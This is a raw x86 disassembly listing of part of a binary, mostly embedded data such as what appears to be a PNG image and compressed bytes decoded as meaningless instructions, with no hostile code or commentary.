  41e386:	add    BYTE PTR [esi],cl
  41e388:	add    BYTE PTR [eax+0x0],dl
  41e38b:	pop    ss
  41e38c:	add    BYTE PTR [eax+0x0],dh
  41e38f:	and    DWORD PTR [eax],eax
  41e391:	nop
  41e392:	add    BYTE PTR [ebx],ch
  41e394:	add    BYTE PTR [eax-0x30ffca00],dh
  41e39a:	add    BYTE PTR [eax+0x0],al
  41e39d:	lock add BYTE PTR [ecx+0x0],cl
  41e3a1:	call   DWORD PTR [ecx]
  41e3a3:	pop    edx
  41e3a4:	add    bh,bh
  41e3a6:	xor    DWORD PTR [eax+0x0],esi
  41e3a9:	call   DWORD PTR [ecx-0x7a]
  41e3ac:	add    bh,bh
  41e3ae:	jno    0x41e34c
  41e3b0:	add    bh,bh
  41e3b2:	xchg   ecx,eax
  41e3b3:	mov    dl,0x0
  41e3b5:	push   DWORD PTR [ecx-0x2e00ff38]
  41e3bb:	fild   WORD PTR [eax]
  41e3bd:	(bad)  
  41e3be:	(bad)  
  41e3bf:	inc    DWORD PTR [eax]
  41e3c1:	add    BYTE PTR [eax],al
  41e3c3:	add    BYTE PTR [eax],al
  41e3c5:	das    
  41e3c6:	add    BYTE PTR [eax],ah
  41e3c8:	add    BYTE PTR [eax+0x0],dl
  41e3cb:	add    BYTE PTR ss:[eax+0x0],dh
  41e3cf:	dec    esp
  41e3d0:	add    BYTE PTR [eax-0x4fff9e00],dl
  41e3d6:	add    BYTE PTR [eax+0x0],bh
  41e3d9:	iret   
  41e3da:	add    BYTE PTR [esi-0x5bff1000],cl
  41e3e0:	add    bh,bh
  41e3e2:	adc    DWORD PTR [ebx-0x41ce0100],esi
  41e3e8:	add    bh,bh
  41e3ea:	push   ecx
  41e3eb:	mov    DWORD PTR [eax],0xd171ff
  41e3f1:	call   DWORD PTR [ecx-0x4e00ff24]
  41e3f7:	in     eax,0x0
  41e3f9:	call   ecx
  41e3fb:	lock add bh,bh
  41e3fe:	(bad)  
  41e3ff:	inc    DWORD PTR [eax]
  41e401:	add    BYTE PTR [eax],al
  41e403:	add    BYTE PTR [eax],al
  41e405:	sub    al,0x0
  41e407:	das    
  41e408:	add    BYTE PTR [ebx+0x0],cl
  41e40b:	push   eax
  41e40c:	add    BYTE PTR [ecx+0x0],ch
  41e40f:	jo     0x41e411
  41e411:	xchg   DWORD PTR [eax],eax
  41e413:	nop
  41e414:	add    BYTE PTR [ebp-0x3bff5000],ah
  41e41a:	add    bh,cl
  41e41c:	add    cl,ah
  41e41e:	add    al,dh
  41e420:	add    al,dh
  41e422:	adc    edi,edi
  41e424:	add    dl,dh
  41e426:	xor    edi,edi
  41e428:	add    ah,dh
  41e42a:	push   ecx
  41e42b:	inc    DWORD PTR [eax]
  41e42d:	div    BYTE PTR [ecx-0x1]
  41e430:	add    bh,dh
  41e432:	xchg   ecx,eax
  41e433:	inc    DWORD PTR [eax]
  41e435:	stc    
  41e436:	mov    cl,0xff
  41e438:	add    bl,bh
  41e43a:	sar    edi,1
  41e43c:	add    bh,bh
  41e43e:	(bad)  
  41e43f:	inc    DWORD PTR [eax]
  41e441:	add    BYTE PTR [eax],al
  41e443:	add    BYTE PTR [eax],al
  41e445:	sbb    eax,DWORD PTR [eax]
  41e447:	das    
  41e448:	add    BYTE PTR ds:0x3f005000,ch
  41e44e:	add    BYTE PTR [eax+0x0],dh
  41e451:	push   edx
  41e452:	add    BYTE PTR [eax-0x4fff9d00],dl
  41e458:	add    BYTE PTR [esi+0x0],dh
  41e45b:	iret   
  41e45c:	add    BYTE PTR [eax-0x66ff1000],cl
  41e462:	adc    edi,edi
  41e464:	add    BYTE PTR [esi-0x4bff00cf],ah
  41e46a:	push   ecx
  41e46b:	inc    DWORD PTR [eax]
  41e46d:	ret    0xff71
  41e470:	add    bh,cl
  41e472:	xchg   ecx,eax
  41e473:	inc    DWORD PTR [eax]
  41e475:	fdiv   QWORD PTR [ecx-0x2e14ff01]
  41e47b:	inc    DWORD PTR [eax]
  41e47d:	(bad)  
  41e47e:	(bad)  
  41e47f:	inc    DWORD PTR [eax]
  41e481:	add    BYTE PTR [eax],al
  41e483:	add    BYTE PTR [eax],al
  41e485:	or     BYTE PTR [eax],al
  41e487:	das    
  41e488:	add    BYTE PTR [esi],cl
  41e48a:	add    BYTE PTR [eax+0x0],dl
  41e48d:	adc    eax,0x1b007000
  41e492:	add    BYTE PTR [eax-0x4fffdf00],dl
  41e498:	add    BYTE PTR [esi],ah
  41e49a:	add    bh,cl
  41e49c:	add    BYTE PTR [eax+eax*1],ch
  41e49f:	lock add BYTE PTR [esi],bh
  41e4a2:	adc    edi,edi
  41e4a4:	add    BYTE PTR [eax+0x31],bl
  41e4a7:	inc    DWORD PTR [eax]
  41e4a9:	jno    0x41e4fc
  41e4ab:	inc    DWORD PTR [eax]
  41e4ad:	mov    WORD PTR [ecx-0x1],?
  41e4b0:	add    BYTE PTR [esi-0x40ff006f],ah
  41e4b6:	mov    cl,0xff
  41e4b8:	add    dl,bl
  41e4ba:	sar    edi,1
  41e4bc:	add    bh,bh
  41e4be:	(bad)  
  41e4bf:	inc    DWORD PTR [eax]
	...
  41e4e1:	add    BYTE PTR [eax],al
  41e4e3:	add    al,BYTE PTR [edx]
  41e4e5:	add    BYTE PTR [edx],al
  41e4e7:	add    DWORD PTR [ebx],eax
  41e4e9:	add    al,BYTE PTR [ecx]
  41e4eb:	add    DWORD PTR [edx],eax
  41e4ed:	add    eax,DWORD PTR [edx]
  41e4ef:	add    BYTE PTR [eax],al
  41e4f1:	add    BYTE PTR [edx],al
  41e4f3:	pop    esi
  41e4f4:	pop    ebx
  41e4f5:	pop    esi
  41e4f6:	pop    esp
  41e4f7:	pop    esi
  41e4f8:	add    al,BYTE PTR [edx]
  41e4fa:	pop    esi
  41e4fb:	pop    esi
  41e4fc:	pop    esi
  41e4fd:	pop    ebp
  41e4fe:	pop    esi
  41e4ff:	pop    es
  41e500:	add    BYTE PTR [ebx],dl
  41e502:	pop    esi
  41e503:	pop    eax
  41e504:	push   edx
  41e505:	dec    esp
  41e506:	push   edi
  41e507:	pop    esi
  41e508:	add    al,BYTE PTR [eax]
  41e50a:	push   ebx
  41e50b:	push   ebp
  41e50c:	dec    esi
  41e50d:	push   esp
  41e50e:	pop    edx
  41e50f:	pop    esi
  41e510:	or     BYTE PTR [esi+0x59],bl
  41e513:	push   eax
  41e514:	or     eax,0x4d3607
  41e519:	add    BYTE PTR ds:0x51110043,dh
  41e51f:	push   esi
  41e520:	dec    edi
  41e521:	sub    BYTE PTR [edi+0x10],al
  41e524:	add    BYTE PTR [eax],al
  41e526:	and    DWORD PTR [esi+0x2],eax
  41e529:	add    BYTE PTR [edx],ah
  41e52b:	inc    ebp
  41e52c:	add    BYTE PTR [eax],al
  41e52e:	and    BYTE PTR [esi+eiz*1+0x1e],al
  41e532:	dec    ebx
  41e533:	push   ss
  41e534:	add    BYTE PTR [ecx],dh
  41e536:	dec    ecx
  41e537:	dec    edx
  41e538:	add    DWORD PTR [eax],eax
  41e53a:	sbb    BYTE PTR [ebx],bh
  41e53c:	add    BYTE PTR [eax],al
  41e53e:	(bad)  
  41e540:	pop    ds
  41e541:	sbb    eax,0x5000648
  41e546:	add    DWORD PTR [ebx+eax*1],eax
  41e549:	add    BYTE PTR [eax],bl
  41e54b:	and    eax,0x320b0000
  41e550:	sub    bl,BYTE PTR [eax+esi*1]
  41e553:	adc    al,0x1
  41e555:	add    BYTE PTR [eax],al
  41e557:	add    BYTE PTR [eax],al
  41e559:	add    BYTE PTR [esi],cl
  41e55b:	sbb    al,BYTE PTR [eax]
  41e55d:	add    BYTE PTR [ebx],bl
  41e55f:	xor    al,0x4a
  41e561:	adc    eax,0x60a243a
  41e566:	movaps XMMWORD PTR [edx],xmm0
  41e569:	add    BYTE PTR [esi],bl
  41e56b:	sub    ebx,DWORD PTR [eax]
  41e56d:	pop    ss
  41e56e:	sub    eax,0x4001193f
  41e573:	inc    ecx
  41e574:	cs cmp al,0x39
  41e577:	cmp    BYTE PTR ds:0x2c3e3709,al
  41e57d:	das    
  41e57e:	inc    edx
  41e57f:	sbb    DWORD PTR [eax],eax
  41e581:	add    BYTE PTR [ecx],al
  41e583:	and    esi,DWORD PTR [ebx]
  41e585:	dec    edx
  41e586:	dec    edx
  41e587:	dec    edx
  41e588:	or     al,0x27
  41e58a:	dec    edx
  41e58b:	inc    edx
  41e58c:	inc    edx
  41e58d:	and    ebx,DWORD PTR [ecx]
  41e58f:	add    BYTE PTR [eax],al
  41e591:	add    BYTE PTR [eax],al
  41e593:	add    DWORD PTR [edx],eax
  41e595:	add    cl,BYTE PTR [ecx]
  41e597:	add    dl,BYTE PTR [edx]
  41e599:	add    al,BYTE PTR [edx]
  41e59b:	add    al,BYTE PTR [edx]
  41e59d:	add    DWORD PTR [eax],eax
	...
  41e5bf:	add    BYTE PTR [eax],al
  41e5c1:	(bad)  
  41e5c2:	inc    DWORD PTR [eax]
  41e5c4:	add    bh,bh
  41e5c6:	inc    DWORD PTR [eax]
  41e5c8:	add    al,al
  41e5ca:	add    eax,DWORD PTR [eax]
  41e5cc:	add    BYTE PTR [eax+0x1],al
  41e5d2:	add    BYTE PTR [eax],0x0
  41e5d5:	add    BYTE PTR [eax-0x67e80000],dl
  41e5db:	add    BYTE PTR [eax],al
  41e5dd:	adc    BYTE PTR [eax-0x67f00000],bl
  41e5e3:	add    BYTE PTR [eax],al
  41e5e5:	seto   BYTE PTR [eax]
  41e5e8:	add    BYTE PTR [eax],al
  41e5ea:	add    BYTE PTR [eax],0x0
  41e5ed:	add    BYTE PTR [ecx],al
  41e5ef:	add    BYTE PTR [eax],al
  41e5f1:	add    BYTE PTR [ebx],0x0
  41e5f4:	add    al,al
  41e5f6:	pop    es
  41e5f7:	add    BYTE PTR [eax],al
  41e5f9:	(bad)  
  41e5fa:	inc    DWORD PTR [eax]
  41e5fc:	add    bh,bh
  41e5fe:	inc    DWORD PTR [eax]
  41e600:	add    BYTE PTR [ecx+0xd474e50],cl
  41e606:	or     bl,BYTE PTR [edx]
  41e608:	or     al,BYTE PTR [eax]
  41e60a:	add    BYTE PTR [eax],al
  41e60c:	or     eax,0x52444849
  41e611:	add    BYTE PTR [eax],al
  41e613:	add    DWORD PTR [eax],eax
  41e615:	add    BYTE PTR [eax],al
  41e617:	add    DWORD PTR [eax],eax
  41e619:	or     BYTE PTR [esi],al
  41e61b:	add    BYTE PTR [eax],al
  41e61d:	add    BYTE PTR [edx+esi*2-0x58],bl
  41e621:	data16 add BYTE PTR [eax],al
  41e624:	(bad)  
  41e625:	dec    DWORD PTR [ecx+0x44]
  41e628:	inc    ecx
  41e629:	push   esp
  41e62a:	js     0x41e606
  41e62c:	in     al,dx
  41e62d:	mov    ebp,0x57249807
  41e632:	jne    0x41e66a
  41e634:	cld    
  41e635:	push   esi
  41e636:	jne    0x41e606
  41e638:	imul   esi,edx,0x6aceecee
  41e63e:	ja     0x41e5f5
  41e640:	retf   0x4ac1
  41e643:	and    al,0x1
  41e645:	and    ah,BYTE PTR [edi+0x30]
  41e648:	mov    dh,0x31
  41e64a:	ss cld 
  41e64c:	add    cl,0xc6
  41e64f:	jl     0x41e637
  41e651:	aaa    
  41e652:	pop    ecx
  41e653:	lahf   
  41e654:	aas    
  41e655:	ins    BYTE PTR es:[edi],dx
  41e656:	cld    
  41e657:	or     ecx,0xe
  41e65a:	xor    BYTE PTR [ecx],0x36
  41e65d:	ss leave 
  41e65f:	mov    BYTE PTR [eax-0x7efbbdf3],0x41
  41e666:	dec    eax
  41e667:	and    BYTE PTR [esp+esi*4-0x2a1af6dc],al
  41e66e:	dec    edx
  41e66f:	dec    eax
  41e670:	fwait
  41e671:	ja     0x41e6e9
  41e673:	repnz dec esp
  41e675:	out    0xdc,eax
  41e677:	aad    0x55
  41e679:	cmc    
  41e67a:	mov    edi,0x4d5f76e7
  41e67f:	ins    DWORD PTR es:[edi],dx
  41e680:	imul   edx,DWORD PTR [esi+0x1],0xffffff85
  41e684:	in     eax,0x43
  41e686:	push   ebx
  41e687:	sti    
  41e688:	aam    0x4e
  41e68a:	xchg   edx,ebp
  41e68c:	stos   BYTE PTR es:[edi],al
  41e68d:	sbb    ecx,esi
  41e68f:	jns    0x41e660
  41e691:	jnp    0x41e681
  41e693:	cmp    eax,0xf035cf7
  41e698:	bnd js 0x41e685
  41e69b:	xor    ebx,DWORD PTR [edi+0x7e]
  41e69e:	inc    ecx
  41e69f:	mov    ebx,0x568bf855
  41e6a4:	mov    bl,0x72
  41e6a6:	loope  0x41e705
  41e6a8:	ja     0x41e696
  41e6aa:	push   ds
  41e6ab:	push   0x36
  41e6ad:	imul   ecx,DWORD PTR [edi],0xfffffff6
  41e6b0:	push   ss
  41e6b1:	jmp    0x41e67a
  41e6b3:	cli    
  41e6b4:	mov    cl,0x7e
  41e6b6:	cmp    al,0x4c
  41e6b8:	mov    esi,0xf1b5938d
  41e6be:	icebp  
  41e6bf:	lea    esi,[edi+0x7fed3a75]
  41e6c5:	mov    edx,0xbf9bb6ed
  41e6ca:	cli    
  41e6cb:	pusha  
  41e6cc:	jg     0x41e73d
  41e6ce:	cmp    al,0xd0
  41e6d0:	or     edi,edi
  41e6d2:	loope  0x41e6f3
  41e6d4:	ds stc 
  41e6d6:	(bad)  
  41e6d7:	out    dx,eax
  41e6d8:	pop    esi
  41e6d9:	jle    0x41e6b4
  41e6db:	jnp    0x41e75b
  41e6dd:	not    bl
  41e6df:	popf   
  41e6e0:	inc    ebx
  41e6e1:	in     eax,dx
  41e6e2:	jbe    0x41e6cf
  41e6e4:	js     0x41e6bd
  41e6e6:	jnp    0x41e6e5
  41e6e8:	pop    eax
  41e6e9:	aas    
  41e6ea:	(bad)  
  41e6eb:	pop    DWORD PTR [ecx+0x36c99323]
  41e6f1:	daa    
  41e6f2:	daa    
  41e6f3:	aaa    
  41e6f4:	jg     0x41e770
  41e6f6:	xlat   BYTE PTR ds:[ebx]
  41e6f7:	scas   al,BYTE PTR es:[edi]
  41e6f8:	pop    ebx
  41e6f9:	fmulp  st(1),st
  41e6fb:	mov    bh,0xcd
  41e6fd:	pop    es
  41e6fe:	repnz fwait
  41e700:	sti    
  41e701:	add    eax,0xe9be3780
  41e706:	outs   dx,DWORD PTR ds:[esi]
  41e707:	sahf   
  41e708:	stc    
  41e709:	lods   eax,DWORD PTR ds:[esi]
  41e70a:	retf   
  41e70b:	(bad)  
  41e70c:	sti    
  41e70d:	mov    edi,0xdf666e6
  41e712:	cmp    ecx,DWORD PTR [esi-0x47144383]
  41e718:	jle    0x41e6c6
  41e71a:	pop    ds
  41e71b:	jmp    0x41e6e4
  41e71d:	std    
  41e71e:	sbb    al,0xa9
  41e720:	push   esp
  41e721:	mov    edx,0xbd0f4c95
  41e726:	repz enter 0x7de1,0xff
  41e72b:	js     0x41e7ac
  41e72d:	xlat   BYTE PTR ds:[ebx]
  41e72e:	push   ds
  41e72f:	adc    eax,DWORD PTR [eax]
  41e731:	fdivp  st(5),st
  41e733:	out    dx,al
  41e734:	scas   eax,DWORD PTR es:[edi]
  41e735:	push   es
  41e736:	out    dx,eax
  41e737:	mov    edx,0x5f4faaeb
  41e73c:	stc    
  41e73d:	std    
  41e73e:	outs   dx,DWORD PTR ds:[esi]
  41e73f:	mov    esp,0x395c54ba
  41e744:	fidiv  WORD PTR [ebp+0x5a]
  41e747:	aas    
  41e748:	(bad)  
  41e749:	(bad)  
  41e74a:	cmc    
  41e74b:	jecxz  0x41e78e
  41e74d:	push   ds
  41e74e:	cmp    esi,DWORD PTR [esi-0x14]
  41e751:	mov    eax,0xefbbeee5
  41e756:	jle    0x41e77a
  41e758:	out    dx,al
  41e759:	or     DWORD PTR ds:0x6f0009ac,0x7d
  41e760:	jmp    0x41e7a9
  41e762:	mov    dl,0x7b
  41e764:	neg    dh
  41e766:	jb     0x41e735
  41e768:	imul   DWORD PTR [edi-0x69161504]
  41e76e:	aad    0x39
  41e770:	fdivrp st(5),st
  41e772:	pop    eax
  41e773:	aas    
  41e774:	(bad)  
  41e775:	(bad)  
  41e776:	cmc    
  41e777:	jecxz  0x41e7d0
  41e779:	cmp    al,0x86
  41e77b:	xchg   DWORD PTR [edi+0xb],eax
  41e77e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e77f:	mov    DWORD PTR [ebx+0x16],esi
  41e782:	pop    ss
  41e783:	pop    ss
  41e784:	shrd   ebp,esi,cl
  41e787:	std    
  41e788:	mov    ebp,0x4b92e000
  41e78d:	cs pop ds
  41e78f:	(bad)  
  41e790:	shl    BYTE PTR ds:0x7fedbc5f,cl
  41e796:	mov    esi,0xe3f1e5f1
  41e79b:	pop    ebp
  41e79c:	clc    
  41e79d:	cmc    
  41e79e:	arpl   bp,di
  41e7a0:	pop    eax
  41e7a1:	aas    
  41e7a2:	push   ds
  41e7a3:	cli    
  41e7a4:	xchg   ecx,eax
  41e7a5:	dec    esp
  41e7a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7a7:	cmp    al,cl
  41e7a9:	pusha  
  41e7aa:	loopne 0x41e79d
  41e7ac:	sub    ebp,DWORD PTR [ebx]
  41e7ae:	sub    esi,DWORD PTR [edi]
  41e7b0:	movd   DWORD PTR [edi+0x14],mm6
  41e7b4:	add    BYTE PTR [esp+eiz*8+0x23],bh
  41e7b8:	xchg   edi,eax
  41e7b9:	inc    esp
  41e7ba:	sub    cl,BYTE PTR [ebp-0x10424803]
  41e7c0:	fucomp st(7)
  41e7c2:	(bad)  
  41e7c4:	cmp    dh,cl
  41e7c6:	icebp  
  41e7c7:	cs idiv edx
  41e7ca:	mov    cl,0x7e
  41e7cc:	lods   al,BYTE PTR ds:[esi]
  41e7cd:	pop    ds
  41e7ce:	psrlq  mm2,QWORD PTR [ecx-0x3e145ab6]
  41e7d5:	pusha  
  41e7d6:	push   0xffffffdb
  41e7d8:	repnz repnz loope 0x41e7e1
  41e7dc:	out    dx,eax
  41e7dd:	out    0x47,eax
  41e7df:	add    eax,eax
  41e7e1:	(bad)  
  41e7e3:	idiv   ebx
  41e7e5:	mov    edi,0xf89faff7
  41e7ea:	loopne 0x41e85f
  41e7ec:	call   0xfaef:0x2ef1c6cd
  41e7f3:	mov    cl,0x7e
  41e7f5:	lods   al,BYTE PTR ds:[esi]
  41e7f6:	pop    ds
  41e7f7:	psllq  mm2,QWORD PTR [ecx+0x150f6749]
  41e7fe:	dec    ebx
  41e7ff:	test   DWORD PTR ds:0x5f8f797c,ebx
  41e805:	jg     0x41e816
  41e807:	add    ah,bh
  41e809:	out    dx,al
  41e80a:	sub    ebx,esi
  41e80c:	cli    
  41e80d:	addr16 xchg edi,eax
  41e80f:	pop    edi
  41e810:	imul   bh
  41e812:	call   edx
  41e814:	test   al,0x97
  41e816:	(bad)  
  41e817:	ja     0x41e852
  41e819:	xlat   BYTE PTR ds:[ebx]
  41e81a:	(bad)  
  41e81b:	cmc    
  41e81c:	arpl   bp,di
  41e81e:	js     0x41e7a4
  41e820:	mov    cs,WORD PTR [ebp+0x1b]
  41e823:	aaa    
  41e824:	pop    edi
  41e825:	cmp    bh,BYTE PTR ds:0xfa65f873
  41e82b:	mov    ebp,0xbeb78002
  41e830:	sti    
  41e831:	xor    ebx,ecx
  41e833:	imul   edi,DWORD PTR [edi-0x64267a05],0x6f
  41e83a:	cld    
  41e83b:	jno    0x41e835
  41e83d:	js     0x41e856
  41e83f:	jo     0x41e83e
  41e841:	pop    eax
  41e842:	aas    
  41e843:	(bad)  
  41e844:	pop    DWORD PTR [edi-0x12]
  41e847:	xor    BYTE PTR [ebx+eax*8],cl
  41e84a:	or     eax,0x3417c387
  41e84f:	fwait
  41e850:	int    0x1b
  41e852:	aam    0x7b
  41e854:	stc    
  41e855:	out    dx,eax
  41e856:	pop    edi
  41e857:	(bad)  
  41e858:	in     eax,dx
  41e859:	or     ebx,DWORD PTR [edi+0x5f1bd37b]
  41e85f:	sti    
  41e860:	pop    edx
  41e861:	fucomi st,st(6)
  41e863:	push   ds
  41e864:	out    dx,eax
  41e865:	repnz lods eax,DWORD PTR ds:[esi]
  41e867:	pop    ds
  41e868:	jmp    0x41e831
  41e86a:	cli    
  41e86b:	icebp  
  41e86c:	or     BYTE PTR [edi],bl
  41e86e:	cdq    
  41e86f:	dec    esp
  41e870:	jbe    0x41e8f1
  41e872:	mov    cl,0x58
  41e874:	fsub   DWORD PTR [esi]
  41e876:	scas   eax,DWORD PTR es:[edi]
  41e877:	lea    ecx,[edi]
  41e879:	jl     0x41e877
  41e87b:	jae    0x41e840
  41e87d:	pop    edi
  41e87e:	(bad)  
  41e87f:	test   edi,0xedbeeece
  41e885:	out    0x81,eax
  41e887:	jecxz  0x41e8e6
  41e889:	mov    al,0xf5
  41e88b:	arpl   bp,di
  41e88d:	pop    eax
  41e88e:	aas    
  41e88f:	push   ds
  41e890:	popf   
  41e891:	ret    
  41e892:	out    dx,eax
  41e893:	idiv   DWORD PTR [edi]
  41e895:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e896:	fucomi st,st(5)
  41e898:	out    dx,al
  41e899:	xor    al,0xde
  41e89b:	(bad)  
  41e89c:	pop    ss
  41e89d:	pop    ds
  41e89e:	stc    
  41e89f:	mov    ecx,DWORD PTR [edi+0x7c]
  41e8a2:	in     al,dx
  41e8a3:	das    
  41e8a4:	aas    
  41e8a5:	fsub   st(1),st
  41e8a7:	mov    ah,0x8f
  41e8a9:	ja     0x41e844
  41e8ab:	(bad)  
  41e8ac:	(bad)  
  41e8ad:	cmc    
  41e8ae:	arpl   bp,di
  41e8b0:	js     0x41e846
  41e8b2:	mov    ss,ecx
  41e8b4:	ror    DWORD PTR [ecx-0x31d1d361],1
  41e8ba:	pop    ebp
  41e8bb:	push   0x1794f85c
  41e8c0:	sbb    eax,0xdfb5f1fa
  41e8c5:	fidivr WORD PTR [esp+edi*4+0xb]
  41e8c9:	mov    ah,0x7e
  41e8cb:	lods   al,BYTE PTR ds:[esi]
  41e8cc:	pop    ds
  41e8cd:	jmp    0x41e896
  41e8cf:	mov    ds:0x1020477,eax
  41e8d4:	(bad)  [edx+0x61b1b4ac]
  41e8da:	ret    
  41e8db:	push   esi
  41e8dc:	ja     0x41e954
  41e8de:	jbe    0x41e8df
  41e8e0:	icebp  
  41e8e1:	cs iret 
  41e8e3:	cli    
  41e8e4:	mov    cl,0x7e
  41e8e6:	lods   al,BYTE PTR ds:[esi]
  41e8e7:	pop    ds
  41e8e8:	(bad)  
  41e8e9:	repnz loope 0x41e8f7
  41e8ec:	push   es
  41e8ed:	pop    edi
  41e8ee:	fs clc 
  41e8f0:	std    
  41e8f1:	inc    ecx
  41e8f2:	mov    bh,0xdb
  41e8f4:	pop    ebp
  41e8f5:	maskmovq mm3,(bad)
  41e8f6:	neg    DWORD PTR [ebp+0x3f]
  41e8f9:	(bad)  
  41e8fa:	pop    edi
  41e8fc:	fidiv  DWORD PTR [ecx]
  41e8fe:	cmp    dh,BYTE PTR [ecx]
  41e900:	icebp  
  41e901:	pop    edi
  41e902:	xor    cl,BYTE PTR [ebx]
  41e904:	loopne 0x41e924
  41e906:	out    dx,eax
  41e907:	sub    BYTE PTR [edi+ebx*1-0xe053815],0xe8
  41e90f:	pop    ds
  41e910:	fstp   DWORD PTR [esi+ebp*2-0x29]
  41e914:	cmp    al,BYTE PTR [eax]
  41e916:	lods   al,BYTE PTR ds:[esi]
  41e917:	pop    ds
  41e918:	jmp    0x41e8e1
  41e91a:	arpl   sp,si
  41e91c:	mov    ch,al
  41e91e:	loop   0x41e8a5
  41e920:	jne    0x41e922
  41e922:	pop    eax
  41e923:	aas    
  41e924:	(bad)  
  41e925:	pop    edi
  41e927:	call   0x3a45f90d
  41e92c:	jmp    0x41e92e
  41e92e:	mov    al,0x7e
  41e930:	lods   al,BYTE PTR ds:[esi]
  41e931:	pop    ds
  41e932:	(bad)  
  41e933:	loope  0x41e998
  41e935:	sbb    eax,0xf58fd600
  41e93a:	jecxz  0x41e96d
  41e93c:	jl     0x41e8ea
  41e93e:	add    eax,eax
  41e940:	cli    
  41e941:	mov    cl,0x7e
  41e943:	cmp    al,0x86
  41e945:	(bad)  
  41e946:	jne    0x41e948
  41e948:	pop    eax
  41e949:	aas    
  41e94a:	(bad)  
  41e94b:	pop    edi
  41e94d:	lock mov cl,0xe
  41e950:	add    bl,ch
  41e952:	(bad)  
  41e953:	cli    
  41e954:	icebp  
  41e955:	sbb    BYTE PTR [esi],bh
  41e957:	(bad)  
  41e958:	add    DWORD PTR [eax-0x3],esp
  41e95b:	pop    eax
  41e95c:	aas    
  41e95d:	push   ds
  41e95e:	ret    
  41e95f:	(bad)  
  41e960:	cmp    al,BYTE PTR [eax]
  41e962:	lods   al,BYTE PTR ds:[esi]
  41e963:	pop    ds
  41e964:	jmp    0x41e92d
  41e966:	arpl   ax,di
  41e968:	pop    eax
  41e969:	pop    es
  41e96a:	add    BYTE PTR [edi-0x10],0x38
  41e96e:	push   esi
  41e96f:	into   
  41e970:	cmc    
  41e971:	cmc    
  41e972:	push   es
  41e973:	pop    edi
  41e974:	cmp    eax,0x8a636fee
  41e979:	cmc    
  41e97a:	mov    dh,0x7a
  41e97c:	fs pop edi
  41e97f:	xor    al,0x0
  41e981:	sbb    BYTE PTR [ebx],al
  41e983:	scas   eax,DWORD PTR es:[edi]
  41e984:	lea    esi,ds:0xf7a87f3e
  41e98a:	mov    esi,0xc7b97baf
  41e98f:	js     0x41e98e
  41e991:	pusha  
  41e992:	push   cs
  41e993:	xlat   BYTE PTR ds:[ebx]
  41e994:	repz fild DWORD PTR [edi]
  41e997:	jnp    0x41e958
  41e999:	inc    edi
  41e99a:	mov    dl,0xfe
  41e99c:	pmulhuw mm7,QWORD PTR [ecx-0x41]
  41e9a0:	dec    edx
  41e9a1:	sti    
  41e9a2:	mov    eax,0x57e6b8c7
  41e9a7:	ins    DWORD PTR es:[edi],dx
  41e9a8:	add    edi,0xfffffffa
  41e9ab:	icebp  
  41e9ac:	cwde   
  41e9ad:	add    eax,DWORD PTR [eax]
  41e9af:	scas   eax,DWORD PTR es:[edi]
  41e9b0:	loopne 0x41ea2b
  41e9b2:	dec    edi
  41e9b3:	shl    ebx,cl
  41e9b5:	pop    ss
  41e9b6:	sahf   
  41e9b7:	imul   DWORD PTR [ebx+0x1d]
  41e9ba:	(bad)  
  41e9bb:	push   edx
  41e9bc:	mov    edx,0xe06beeb5
  41e9c1:	xor    DWORD PTR [ecx],0x9d20781
  41e9c7:	fisub  WORD PTR [edi+0x7a]
  41e9ca:	dec    edi
  41e9cb:	(bad)  
  41e9cc:	repz pop ss
  41e9ce:	sahf   
  41e9cf:	test   edi,0xe55aefba
  41e9d5:	mov    ebx,0x5c3ffabf
  41e9da:	mov    al,ds:0xfe296b0
  41e9df:	jle    0x41ea57
  41e9e1:	sub    al,0x65
  41e9e3:	pop    esi
  41e9e4:	dec    ebx
  41e9e5:	fnstcw WORD PTR [ebp+0x77b83b9f]
  41e9eb:	fld    TBYTE PTR [ebp+esi*2-0x1092fc23]
  41e9f2:	mov    edx,0x800298f1
  41e9f8:	inc    ecx
  41e9f9:	mov    eax,ds:0xe827a1f7
  41e9fe:	push   WORD PTR [ebp-0x3b250c31]
  41ea05:	mov    ebp,0xe9507815
  41ea0a:	and    BYTE PTR [ebx-0x210f926b],0xc6
  41ea11:	xor    esi,ebp
  41ea13:	add    ebx,esp
  41ea15:	mov    bh,0xe5
  41ea17:	cmp    dl,dh
  41ea19:	xor    eax,edi
  41ea1b:	jl     0x41ea9a
  41ea1d:	fiadd  DWORD PTR [ebx]
  41ea1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea20:	pop    ss
  41ea21:	adc    BYTE PTR [esi],al
  41ea23:	add    eax,0xf7852d7f
  41ea28:	loope  0x41ea08
  41ea2a:	cmc    
  41ea2b:	not    esi
  41ea2d:	loope  0x41e9ed
  41ea2f:	inc    eax
  41ea30:	in     al,dx
  41ea31:	mov    eax,ds:0x67e0c1f4
  41ea36:	imul   edx,ebp,0x75
  41ea39:	mov    al,0xde
  41ea3b:	sub    edi,0x7
  41ea3e:	add    eax,edx
  41ea40:	(bad)  [esi]
  41ea42:	imul   edi,DWORD PTR [ebp-0x49],0xe
  41ea46:	push   cs
  41ea47:	inc    edi
  41ea48:	pop    ds
  41ea49:	mov    edi,0x1c600091
  41ea4e:	jecxz  0x41ea83
  41ea50:	scas   eax,DWORD PTR es:[edi]
  41ea51:	lock imul eax,DWORD PTR [ecx+0x6fff7f7],0xfffffffb
  41ea59:	scas   eax,DWORD PTR es:[edi]
  41ea5a:	std    
  41ea5b:	sahf   
  41ea5c:	iret   
  41ea5d:	xor    al,0x38
  41ea5f:	call   0x924cdcaa
  41ea64:	lea    edi,[ebx+0xb]
  41ea67:	xchg   esi,eax
  41ea68:	and    DWORD PTR [ebx-0x47e33aff],0xc76cb78f
  41ea72:	mov    dl,0x6e
  41ea74:	(bad)  
  41ea75:	cmp    al,BYTE PTR [esi]
  41ea77:	adc    eax,0xeddf9e5f
  41ea7c:	push   DWORD PTR [ebp-0x330158c4]
  41ea82:	neg    BYTE PTR [edi+esi*1+0x8]
  41ea86:	add    BYTE PTR [ebx-0x53145860],al
  41ea8c:	(bad)  [eax]
  41ea8e:	and    BYTE PTR [ebx+0xccbc141],0x1e
  41ea95:	or     dl,BYTE PTR [eax]
  41ea97:	sbb    BYTE PTR [ebx-0x4],ch
  41ea9a:	sbb    eax,0x6ad63d74
  41ea9f:	xchg   edi,eax
  41eaa0:	sti    
  41eaa1:	mov    dl,0xf0
  41eaa3:	fdivp  st(6),st
